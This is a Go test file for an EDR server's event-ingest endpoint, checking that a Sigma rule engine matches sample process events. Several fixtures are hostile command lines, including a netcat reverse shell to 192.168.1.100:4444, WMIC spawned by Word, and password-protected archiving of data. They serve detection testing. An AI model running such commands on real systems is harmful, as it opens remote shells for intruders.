package server

import (
	"bytes"
	"compress/gzip"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"testing"

	"github.com/PhucNguyen204/EDR_V2/internal/rules"
	"github.com/PhucNguyen204/EDR_V2/pkg/engine"
	"github.com/PhucNguyen204/EDR_V2/pkg/sigma"
)

func mustLoadRule(t *testing.T, p string) sigma.RuleIR {
	t.Helper()
	b, err := os.ReadFile(p)
	if err != nil {
		t.Fatalf("read %s: %v", p, err)
	}
	r, err := sigma.LoadRuleYAML(b)
	if err != nil {
		t.Fatalf("load %s: %v", p, err)
	}
	return r
}

func buildServer(t *testing.T) *AppServer {
	// Load tất cả rules từ testdata
	rules, err := rules.LoadDirRecursive("../../testdata/rules")
	if err != nil {
		t.Fatalf("Failed to load rules: %v", err)
	}

	if len(rules) == 0 {
		t.Fatal("No rules found in testdata/rules")
	}

	fm := sigma.NewFieldMapping(map[string]string{
		"Image":              "Image",
		"CommandLine":        "CommandLine",
		"Description":        "Description",
		"OriginalFileName":   "OriginalFileName",
		"ParentImage":        "ParentImage",
		"ProcessImage":       "Image",
		"ProcessCommandLine": "CommandLine",
	})

	eng := engine.Compile(rules, fm)
	return NewAppServer(eng)
}

func TestIngest_ArrayJSON(t *testing.T) {
	s := buildServer(t)
	ts := httptest.NewServer(s.Router())
	defer ts.Close()

	evs := []map[string]any{
		{
			"Image":            `C:\Program Files\7-Zip\7z.exe`,
			"CommandLine":      `7z.exe a out.7z C:\data\* -pS3cret`,
			"Description":      `7-Zip Console`,
			"OriginalFileName": `7z.exe`,
		},
		{
			"Image":       `/usr/bin/nc`,
			"CommandLine": `nc -e /bin/bash 192.168.1.100 4444`,
		},
		{
			"Image":       `C:\Windows\System32\wmic.exe`,
			"CommandLine": `wmic process create call cmd.exe /c "echo test"`,
			"ParentImage": `C:\Program Files\Microsoft Office\WINWORD.EXE`,
		},
	}
	var buf bytes.Buffer
	_ = json.NewEncoder(&buf).Encode(evs)

	req, _ := http.NewRequest("POST", ts.URL+"/ingest", &buf)
	req.Header.Set("Content-Type", "application/json")
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(res.Body)
		t.Fatalf("status=%d, body=%s", res.StatusCode, string(body))
	}
	var out struct {
		Accepted int `json:"accepted"`
		Matched  int `json:"matched"`
		Results  []struct {
			Index   int      `json:"index"`
			Matched []string `json:"matched"`
		} `json:"results"`
	}
	_ = json.NewDecoder(res.Body).Decode(&out)
	if out.Accepted != 3 || len(out.Results) != 3 {
		t.Fatalf("bad response: %+v", out)
	}

	// Kiểm tra ít nhất một event match
	totalMatches := 0
	for _, result := range out.Results {
		totalMatches += len(result.Matched)
	}
	if totalMatches == 0 {
		t.Fatalf("Expected at least one event to match rules, got: %+v", out)
	}

	t.Logf("Test results: %+v", out)
}

func TestIngest_Gzip_Object(t *testing.T) {
	s := buildServer(t)
	ts := httptest.NewServer(s.Router())
	defer ts.Close()

	ev := map[string]any{
		"Image":            `C:\Program Files\7-Zip\7z.exe`,
		"CommandLine":      `7z.exe a out.7z C:\data\* -pS3cret`,
		"Description":      `7-Zip Console`,
		"OriginalFileName": `7z.exe`,
	}
	var raw bytes.Buffer
	_ = json.NewEncoder(&raw).Encode(ev)

	var gz bytes.Buffer
	zw := gzip.NewWriter(&gz)
	_, _ = zw.Write(raw.Bytes())
	_ = zw.Close()

	req, _ := http.NewRequest("POST", ts.URL+"/ingest", &gz)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Encoding", "gzip")
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		t.Fatalf("status=%d", res.StatusCode)
	}

	// Kiểm tra response
	var out struct {
		Accepted int `json:"accepted"`
		Matched  int `json:"matched"`
		Results  []struct {
			Index   int      `json:"index"`
			Matched []string `json:"matched"`
		} `json:"results"`
	}
	_ = json.NewDecoder(res.Body).Decode(&out)
	if out.Accepted != 1 {
		t.Fatalf("Expected 1 accepted event, got %d", out.Accepted)
	}

	t.Logf("Gzip test results: %+v", out)
}

func TestIngest_HealthCheck(t *testing.T) {
	s := buildServer(t)
	ts := httptest.NewServer(s.Router())
	defer ts.Close()

	req, _ := http.NewRequest("GET", ts.URL+"/healthz", nil)
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		t.Fatalf("Expected status 200, got %d", res.StatusCode)
	}
}

func TestStatsAfterIngest(t *testing.T) {
    s := buildServer(t)
    ts := httptest.NewServer(s.Router())
    defer ts.Close()

    // Send two events
    evs := []map[string]any{
        {"CommandLine": "Cannot run program: java.lang.ProcessBuilder"},
        {"Image": `C:\\Program Files\\7-Zip\\7z.exe`, "CommandLine": `7z.exe a out.7z -pS3cret`},
    }
    var buf bytes.Buffer
    _ = json.NewEncoder(&buf).Encode(evs)
    req, _ := http.NewRequest("POST", ts.URL+"/ingest", &buf)
    req.Header.Set("Content-Type", "application/json")
    res, err := http.DefaultClient.Do(req)
    if err != nil { t.Fatal(err) }
    _ = res.Body.Close()

    // Fetch stats
    res2, err := http.Get(ts.URL+"/stats")
    if err != nil { t.Fatal(err) }
    defer res2.Body.Close()
    if res2.StatusCode != http.StatusOK { t.Fatalf("stats status=%d", res2.StatusCode) }
    var st struct {
        TotalRequests uint64 `json:"total_requests"`
        TotalAccepted uint64 `json:"total_accepted"`
        TotalMatched  uint64 `json:"total_matched"`
        Engine        struct{
            Rules int `json:"rules"`
        } `json:"engine"`
    }
    _ = json.NewDecoder(res2.Body).Decode(&st)
    if st.TotalRequests == 0 || st.TotalAccepted != 2 {
        t.Fatalf("unexpected stats: %+v", st)
    }
}

func TestIngest_InvalidMethod(t *testing.T) {
	s := buildServer(t)
	ts := httptest.NewServer(s.Router())
	defer ts.Close()

	req, _ := http.NewRequest("GET", ts.URL+"/ingest", nil)
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusMethodNotAllowed {
		t.Fatalf("Expected status 405, got %d", res.StatusCode)
	}
}

func TestIngest_InvalidJSON(t *testing.T) {
	s := buildServer(t)
	ts := httptest.NewServer(s.Router())
	defer ts.Close()

	req, _ := http.NewRequest("POST", ts.URL+"/ingest", bytes.NewBufferString("invalid json"))
	req.Header.Set("Content-Type", "application/json")
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusBadRequest {
		t.Fatalf("Expected status 400, got %d", res.StatusCode)
	}
}

func TestIngest_EmptyArray(t *testing.T) {
	s := buildServer(t)
	ts := httptest.NewServer(s.Router())
	defer ts.Close()

	var buf bytes.Buffer
	_ = json.NewEncoder(&buf).Encode([]map[string]any{})

	req, _ := http.NewRequest("POST", ts.URL+"/ingest", &buf)
	req.Header.Set("Content-Type", "application/json")
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(res.Body)
		t.Fatalf("Expected status 200, got %d, body=%s", res.StatusCode, string(body))
	}

	var out struct {
		Accepted int `json:"accepted"`
		Matched  int `json:"matched"`
		Results  []struct {
			Index   int      `json:"index"`
			Matched []string `json:"matched"`
		} `json:"results"`
	}
	_ = json.NewDecoder(res.Body).Decode(&out)
	if out.Accepted != 0 || out.Matched != 0 || len(out.Results) != 0 {
		t.Fatalf("Expected empty response, got: %+v", out)
	}
}

func TestIngest_JavaRCEEvent(t *testing.T) {
	s := buildServer(t)
	ts := httptest.NewServer(s.Router())
	defer ts.Close()

	ev := map[string]any{
		"CommandLine": "Cannot run program: java.lang.ProcessBuilder",
		"Message":     "Application error occurred",
		"Level":       "ERROR",
	}

	var buf bytes.Buffer
	_ = json.NewEncoder(&buf).Encode(ev)

	req, _ := http.NewRequest("POST", ts.URL+"/ingest", &buf)
	req.Header.Set("Content-Type", "application/json")
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		t.Fatalf("Expected status 200, got %d", res.StatusCode)
	}

	var out struct {
		Accepted int `json:"accepted"`
		Matched  int `json:"matched"`
		Results  []struct {
			Index   int      `json:"index"`
			Matched []string `json:"matched"`
		} `json:"results"`
	}
	_ = json.NewDecoder(res.Body).Decode(&out)
	if out.Accepted != 1 {
		t.Fatalf("Expected 1 accepted event, got %d", out.Accepted)
	}

	t.Logf("Java RCE test results: %+v", out)
}

func TestIngest_LinuxShellScriptEvent(t *testing.T) {
	s := buildServer(t)
	ts := httptest.NewServer(s.Router())
	defer ts.Close()

	ev := map[string]any{
		"Image":       `/bin/bash`,
		"CommandLine": `bash -c /tmp/suspicious_script.sh`,
		"Pid":         1234,
		"User":        "root",
	}

	var buf bytes.Buffer
	_ = json.NewEncoder(&buf).Encode(ev)

	req, _ := http.NewRequest("POST", ts.URL+"/ingest", &buf)
	req.Header.Set("Content-Type", "application/json")
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		t.Fatalf("Expected status 200, got %d", res.StatusCode)
	}

	var out struct {
		Accepted int `json:"accepted"`
		Matched  int `json:"matched"`
		Results  []struct {
			Index   int      `json:"index"`
			Matched []string `json:"matched"`
		} `json:"results"`
	}
	_ = json.NewDecoder(res.Body).Decode(&out)
	if out.Accepted != 1 {
		t.Fatalf("Expected 1 accepted event, got %d", out.Accepted)
	}

	t.Logf("Linux shell script test results: %+v", out)
}

func TestIngest_MultipleEventTypes(t *testing.T) {
	s := buildServer(t)
	ts := httptest.NewServer(s.Router())
	defer ts.Close()

	evs := []map[string]any{
		// 7zip event
		{
			"Image":            `C:\Program Files\7-Zip\7z.exe`,
			"CommandLine":      `7z.exe a out.7z C:\data\* -pS3cret`,
			"Description":      `7-Zip Console`,
			"OriginalFileName": `7z.exe`,
		},
		// Netcat reverse shell
		{
			"Image":       `/usr/bin/nc`,
			"CommandLine": `nc -e /bin/bash 192.168.1.100 4444`,
		},
		// WMIC via Office
		{
			"Image":       `C:\Windows\System32\wmic.exe`,
			"CommandLine": `wmic process create call cmd.exe /c "echo test"`,
			"ParentImage": `C:\Program Files\Microsoft Office\WINWORD.EXE`,
		},
		// Java RCE
		{
			"CommandLine": "Cannot run program: java.lang.ProcessBuilder",
			"Message":     "Application error occurred",
		},
		// Linux shell script
		{
			"Image":       `/bin/bash`,
			"CommandLine": `bash -c /tmp/suspicious_script.sh`,
		},
		// Unrelated event
		{
			"Message": "System startup completed",
			"Level":   "INFO",
		},
	}

	var buf bytes.Buffer
	_ = json.NewEncoder(&buf).Encode(evs)

	req, _ := http.NewRequest("POST", ts.URL+"/ingest", &buf)
	req.Header.Set("Content-Type", "application/json")
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		t.Fatalf("Expected status 200, got %d", res.StatusCode)
	}

	var out struct {
		Accepted int `json:"accepted"`
		Matched  int `json:"matched"`
		Results  []struct {
			Index   int      `json:"index"`
			Matched []string `json:"matched"`
		} `json:"results"`
	}
	_ = json.NewDecoder(res.Body).Decode(&out)
	if out.Accepted != 6 || len(out.Results) != 6 {
		t.Fatalf("Expected 6 accepted events, got %d accepted, %d results", out.Accepted, len(out.Results))
	}

	t.Logf("Multiple event types test results: %+v", out)
}
